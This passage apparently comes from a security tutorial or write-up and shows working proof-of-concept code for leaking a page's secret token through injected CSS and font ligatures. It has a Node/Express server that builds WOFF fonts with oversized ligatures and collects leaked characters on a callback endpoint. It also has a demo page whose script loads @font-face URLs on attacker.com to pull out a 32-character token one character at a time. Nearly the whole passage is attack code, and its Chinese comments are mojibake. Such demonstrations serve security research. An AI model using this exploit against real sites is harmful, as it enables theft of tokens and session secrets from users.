<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> tmp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'tmp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> rimraf <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'rimraf'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 
<span class="token comment">// Generate a font for a given prefix </span>
<span class="token comment">// and the characters for which the ligature is to be created</span>
<span class="token keyword">function</span> <span class="token function">createFont</span><span class="token punctuation">(</span><span class="token parameter">prefix<span class="token punctuation">,</span> charsToLigature</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> font <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string-property property">"defs"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string-property property">"font"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"hack"</span><span class="token punctuation">,</span>
                    <span class="token string-property property">"horiz-adv-x"</span><span class="token operator">:</span> <span class="token string">"0"</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token string-property property">"font-face"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                        <span class="token string-property property">"font-family"</span><span class="token operator">:</span> <span class="token string">"hack"</span><span class="token punctuation">,</span>
                        <span class="token string-property property">"units-per-em"</span><span class="token operator">:</span> <span class="token string">"1000"</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token string-property property">"glyph"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    
    <span class="token comment">// By default all possible characters have a zero width...</span>
    <span class="token keyword">let</span> glyphs <span class="token operator">=</span> font<span class="token punctuation">.</span>defs<span class="token punctuation">.</span>font<span class="token punctuation">.</span>glyph<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span> c <span class="token operator">&lt;=</span> <span class="token number">0x7e</span><span class="token punctuation">;</span> c <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> glyph <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token string-property property">"unicode"</span><span class="token operator">:</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string-property property">"horiz-adv-x"</span><span class="token operator">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>
                <span class="token string-property property">"d"</span><span class="token operator">:</span> <span class="token string">"M1 0z"</span><span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
        glyphs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>glyph<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token comment">// ... except ligatures, which are EXTREMELY wide.</span>
    charsToLigature<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">c</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> glyph <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token string-property property">"unicode"</span><span class="token operator">:</span> prefix <span class="token operator">+</span> c<span class="token punctuation">,</span>
                <span class="token string-property property">"horiz-adv-x"</span><span class="token operator">:</span> <span class="token string">"10000"</span><span class="token punctuation">,</span>
                <span class="token string-property property">"d"</span><span class="token operator">:</span> <span class="token string">"M1 0z"</span><span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        glyphs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>glyph<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// We convert JSON-a to SVG.</span>
    <span class="token keyword">const</span> xml <span class="token operator">=</span> js2xmlparser<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"svg"</span><span class="token punctuation">,</span> font<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// And next we use fontforge</span>
    <span class="token comment">// to change SVG to WOFF.</span>
    <span class="token keyword">const</span> tmpobj <span class="token operator">=</span> tmp<span class="token punctuation">.</span><span class="token function">dirSync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>tmpobj<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/font.svg</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> xml<span class="token punctuation">)</span><span class="token punctuation">;</span>
    child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">"/usr/bin/fontforge"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>__dirname<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/script.fontforge</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
        <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>tmpobj<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/font.svg</span><span class="token template-punctuation string">`</span></span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token keyword">const</span> woff <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>tmpobj<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/font.woff</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// We delete temporary directory.</span>
    rimraf<span class="token punctuation">.</span><span class="token function">sync</span><span class="token punctuation">(</span>tmpobj<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token comment">// and we give back font in the form of WOFF.</span>
    <span class="token keyword">return</span> woff<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
 
<span class="token comment">// Endpoint for generating fonts.</span>
app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/font/:prefix/:charsToLigature"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> prefix<span class="token punctuation">,</span> charsToLigature <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">;</span>
    
    <span class="token comment">// We make sure that the font is in the cache.</span>
    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token string-property property">'Cache-Control'</span><span class="token operator">:</span> <span class="token string">'public, max-age=600'</span><span class="token punctuation">,</span>
        <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/font-woff'</span><span class="token punctuation">,</span>
        <span class="token string-property property">'Access-Control-Allow-Origin'</span><span class="token operator">:</span> <span class="token string">'*'</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">createFont</span><span class="token punctuation">(</span>prefix<span class="token punctuation">,</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>charsToLigature<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token comment">// Endpoint to accept characters via a callback connection</span>
app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/reverse/:chars"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'chars'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>chars<span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">chars=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>chars<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">; Path=/</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/cookie.js'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">'js.cookie.js'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">root</span><span class="token operator">:</span> <span class="token string">'./node_modules/js-cookie/src/'</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/index.html'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">root</span><span class="token operator">:</span> <span class="token string">'.'</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Listening on </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">...</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>

<p>demo.html</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>utf-8</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>cookie.js</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>big</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>token</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>big</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> <span class="token constant">EXPECTED_TOKEN_LENGTH</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> <span class="token constant">ALPHABET</span> <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token punctuation">;</span>
        <span class="token comment">// æ˜¾ç¤ºå·²è¯»å–çš„ä»¤ç‰Œ</span>
        <span class="token keyword">const</span> outputElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// å­˜å‚¨å·²æå–çš„ä»¤ç‰Œ</span>
        <span class="token keyword">let</span> extractedToken <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
        
        <span class="token comment">// å­˜å‚¨ç”¨äºåˆ›å»ºè¿å­—çš„å‰ç¼€</span>
        <span class="token keyword">let</span> prefix <span class="token operator">=</span> <span class="token string">'"'</span><span class="token punctuation">;</span>
        
        <span class="token comment">// æ³„éœ²å¦ä¸€ä¸ªæ ‡è®°å­—ç¬¦ï¼Œç›´åˆ°æ³„éœ²æ‰€æœ‰å­—ç¬¦</span>
        
        <span class="token keyword">while</span> <span class="token punctuation">(</span>extractedToken<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token constant">EXPECTED_TOKEN_LENGTH</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">const</span> nextTokenChar <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getNextTokenCharacter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            extractedToken <span class="token operator">+=</span> nextTokenChar<span class="token punctuation">;</span>
            
            <span class="token comment">// å°†å–å‡ºçš„æ ‡å¿—æ·»åŠ åˆ°å‰ç¼€ä¸­ç”¨äºè¿›ä¸€æ­¥çš„è¿å­—</span>
            prefix <span class="token operator">+=</span> nextTokenChar<span class="token punctuation">;</span>
            
            <span class="token comment">// åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºç›®å‰ä¸ºæ­¢æˆ‘ä»¬å·²ç»æå–å‡ºçš„ token éƒ¨åˆ†</span>
            outputElement<span class="token punctuation">.</span>textContent <span class="token operator">=</span> extractedToken<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// å½“è¿è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œæˆ‘ä»¬å·²ç»æ‹¥æœ‰äº†å®Œæ•´çš„ token</span>
        <span class="token comment">// åˆ é™¤æ‰€æœ‰ iframe å¹¶å°† token ä»¥ç²—ä½“æ˜¾ç¤º</span>
        <span class="token function">deleteAllIframes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputElement<span class="token punctuation">.</span>style<span class="token punctuation">.</span>fontWeight <span class="token operator">=</span> <span class="token string">'bold'</span><span class="token punctuation">;</span>
        
        <span class="token comment">// ä½¿ç”¨åˆ†æ²»çš„æ–¹æ³•æå–ä¸‹ä¸€ä¸ªæ ‡è®°å­—ç¬¦çš„å‡½æ•°</span>
        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getNextTokenCharacter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// å‡ºäºæ€§èƒ½ç›®çš„ - åˆ é™¤æ‰€æœ‰ç°æœ‰çš„ iframe å…ƒç´ </span>
            <span class="token function">deleteAllIframes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
            <span class="token keyword">let</span> alphabet <span class="token operator">=</span> <span class="token constant">ALPHABET</span><span class="token punctuation">;</span>
            <span class="token comment">//ä¸‹ä¸€ä¸ªæ ‡è®°å­—ç¬¦æ˜¯ä»€ä¹ˆã€‚</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>alphabet<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// ç­‰å¾…åˆ›å»ºä¸€ä¸ªæ–°çš„ cookie - æ‰€ä»¥é¦–å…ˆè®©æˆ‘ä»¬åˆ é™¤æ‰€æœ‰ç°æœ‰çš„ cookie</span>
                <span class="token function">clearAllCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                
                <span class="token keyword">const</span> <span class="token punctuation">[</span>leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">split</span><span class="token punctuation">(</span>alphabet<span class="token punctuation">)</span><span class="token punctuation">;</span>
                
                <span class="token comment">// é¦–å…ˆï¼Œæˆ‘ä»¬ç¡®ä¿ä¸¤ç»„è¿å­—çš„å­—ä½“éƒ½åœ¨ç¼“å­˜ä¸­</span>
                <span class="token keyword">await</span> <span class="token function">makeSureFontsAreCached</span><span class="token punctuation">(</span>leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">)</span><span class="token punctuation">;</span>
                
                <span class="token comment">// æ­¤å¤„äººä¸ºå»¶è¿Ÿä¼šå‡å°‘çš„æ”»å‡»é€ƒé€¸çš„å¯èƒ½æ€§</span>
                <span class="token keyword">await</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                
                <span class="token comment">// ç„¶åæˆ‘ä»¬ä½¿ç”¨â€œæ”»å‡»â€CSS åˆ›å»ºä¸¤ä¸ª iframe</span>
                <span class="token keyword">await</span> Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">createAttackIframe</span><span class="token punctuation">(</span>leftChars<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">createAttackIframe</span><span class="token punctuation">(</span>rightChars<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                
                <span class="token comment">// ç­‰å¾…è¿”å›çš„å­—ç¬¦</span>
                <span class="token keyword">const</span> chars <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getCharsFromReverseConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                
                <span class="token comment">// åœ¨æ­¤åŸºç¡€ä¸Šæˆ‘ä»¬ç»§ç»­â€œåˆ†è€Œæ²»ä¹‹â€ã€‚</span>
                alphabet <span class="token operator">=</span> chars<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">//å¦‚æœæˆ‘ä»¬åœ¨è¿™é‡Œï¼Œé‚£å°±æ„å‘³ç€å­—æ¯è¡¨æœ‰ä¸€ä¸ªå­—ç¬¦ã€‚</span>
            <span class="token comment">//ç»“è®ºï¼šè¿™ä¸ªå­—ç¬¦æ˜¯å¦ä¸€ä¸ª token å­—ç¬¦</span>
            
            <span class="token keyword">return</span> alphabet<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        
        <span class="token keyword">function</span> <span class="token function">clearAllCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">cookie</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                Cookies<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        
        <span class="token keyword">function</span> <span class="token function">deleteAllIframes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">iframe</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                iframe<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        
        <span class="token comment">// è¯¥å‡½æ•°å°†å­—ç¬¦ä¸²åˆ†æˆä¸¤ä¸ªé•¿åº¦ç›¸åŒï¼ˆæˆ–ç›¸å·®ä¸€ï¼‰çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ split("abcd") == ["ab", "cd"];</span>
        <span class="token keyword">function</span> <span class="token function">split</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">const</span> halfLength <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> halfLength<span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>halfLength<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        
        <span class="token comment">// ç”Ÿæˆéšæœºå­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œä¾‹å¦‚ randomValue() == "rand6226966173982633"</span>
        <span class="token keyword">function</span> <span class="token function">randomValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"rand"</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        
        <span class="token comment">//æˆ‘ä»¬ç”Ÿæˆ CSSï¼Œè¿™å°†ç¡®ä¿å­—ä½“ä½äºç¼“å­˜ä¸­ã€‚</span>
        <span class="token comment">//ä½œä¸ºå­—ä½“å·²ç»ä¸‹è½½çš„è¯æ˜ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹æ£€æŸ¥</span>
        <span class="token comment">//æ˜¯å¦å®šä¹‰äº† font_${random_track_characters} cookieã€‚</span>
        <span class="token keyword">function</span> <span class="token function">makeSureFontsAreCached</span><span class="token punctuation">(</span><span class="token parameter">leftChars<span class="token punctuation">,</span> rightChars</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token comment">// æˆ‘ä»¬å¯¹æ‰€æœ‰å€¼è¿›è¡Œç¼–ç ï¼Œä»¥ä¾¿èƒ½å¤Ÿå°†å®ƒä»¬å®‰å…¨åœ°æ”¾ç½®åœ¨ URL ä¸­ã€‚</span>
                <span class="token keyword">let</span> encodedPrefix<span class="token punctuation">;</span>
                <span class="token punctuation">[</span>encodedPrefix<span class="token punctuation">,</span> leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>prefix<span class="token punctuation">,</span> leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">val</span> <span class="token operator">=&gt;</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
                <span class="token comment">// æˆ‘ä»¬ç”Ÿæˆå¼•ç”¨è¿™ä¸¤ç§å­—ä½“çš„ CSSã€‚ä½¿ç”¨ body:before å’Œ body:after ä»¥ç¡®ä¿æµè§ˆå™¨å¿…é¡»ä¸‹è½½è¿™ä¸¤ç§å­—ä½“ã€‚</span>
                <span class="token keyword">const</span> css <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
                    @font-face {
                        font-family: 'hack1';
                        src: url(http://attacker.com/font/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>encodedPrefix<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>leftChars<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)
                    }
                    @font-face {
                        font-family: 'hack2';
                        src: url(http://attacker.com/font/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>encodedPrefix<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>rightChars<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)
                    }
                    body:before {
                        content: 'x';
                        font-family: 'hack1';
                    }
                    body:after {
                        content: 'x';
                        font-family: 'hack2';
                    }
                </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
                
                <span class="token comment">// åˆ›å»ºä¸€ä¸ªå°†åŠ è½½å­—ä½“çš„ iframe</span>
                <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                    <span class="token comment">// è¯¥å‡½æ•°ç›´åˆ°å‘ç”Ÿäº‹ä»¶æ‰ä¼šç»“æŸ</span>
                    <span class="token comment">// iframe å…ƒç´ ä¸­çš„ onload è¢«è§¦å‘</span>
                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://localhost:12345/?css='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>css<span class="token punctuation">)</span><span class="token punctuation">;</span>
                document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        
